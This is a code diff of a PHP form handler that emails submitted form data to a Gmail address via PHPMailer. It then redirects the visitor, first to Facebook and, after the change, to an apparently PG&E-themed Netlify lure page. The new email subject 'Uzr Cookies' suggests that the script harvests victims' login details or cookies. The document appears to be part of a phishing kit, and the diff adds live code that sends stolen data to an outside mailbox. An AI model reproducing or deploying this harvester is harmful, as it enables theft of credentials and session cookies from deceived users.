@@ -2,9 +2,9 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://web.facebook.com/me");
+header("Location: https://urgently-to-from-pge-data.netlify.app/");
 
-require 'Exception.php';
+require 'Exception.php'; 
 require 'PHPMailer.php';
 require 'SMTP.php';
 
@@ -36,16 +36,17 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         // Email properties
         $mail->setFrom('Lernayouamzaxal@gmail.com', 'Ghaliya');
         $mail->addAddress('Lernayouamzaxal@gmail.com');
-        $mail->addAddress('Lernayouamzaxal@gmail.com');
+       $mail->addAddress('Lernayouamzaxal@gmail.com');
+      
+      
 
 
       // Email recipient's address
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'Wahab';
+        $mail->Subject = 'Uzr Cookies';
         $mail->Body = $emailBody; // Set the email body using the collected form data
-
 
         // Send email
         $mail->send();
